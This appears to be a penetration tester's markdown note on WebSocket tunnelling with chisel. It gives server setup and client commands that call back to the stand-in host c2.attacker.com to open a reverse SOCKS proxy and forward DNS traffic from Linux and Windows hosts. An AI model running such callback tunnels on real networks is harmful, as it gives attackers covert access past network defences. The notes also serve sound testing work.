---
title: WebSockets Tunnel
---

[[notes/tunneling/index]] over the [[notes/network/websocket]] protocol.

Start an unauthenticated [[notes/tools/chisel]] server on Linux.

~~~ bash
chisel server --port 80 --socks5 --reverse --auth proxy:"$(uuidgen -r | tee /dev/stderr)"
~~~

Alternatively start a server with authentication where the user `proxy` can bind only to unprivileged ports on localhost.

~~~ bash
cat << 'EOF' > ./users.json
{
  "proxy:passw0rd": [
    "^R:127\\.0\\.0\\.1:[0-9]{4,5}$"
  ]
}
EOF
chisel server --port 80 --socks5 --reverse --authfile ./users.json
~~~

Connect with the client from Linux to establish a reverse [[notes/pivoting/socks-proxy]].

~~~ bash
./chisel client --auth proxy:'passw0rd' http://c2.attacker.com R:127.0.0.1:1080:socks
~~~

Connect with the client from Windows to forward local port 53/udp to port 5300 on the server.

~~~ bat
.\chisel.exe client --fingerprint %fingerprint% --auth proxy:"passw0rd" http://c2.attacker.com R:127.0.0.1:1080:socks 53:127.0.0.1:5300/udp
~~~

> **Note:**
> In at least one instance a HTTP proxy blocked WebSocket connections.
> This can be verified on [piesocket.com](https://www.piesocket.com/websocket-tester).

Untested tools:

- [github.com/meteorite/chisel](https://github.com/Meteorite/chisel/tree/feature-socks-udp-associate), fork with SOCKS5 UDP support
- [wstunnel](https://github.com/erebe/wstunnel), chisel alternative written in Rust, with UDP support
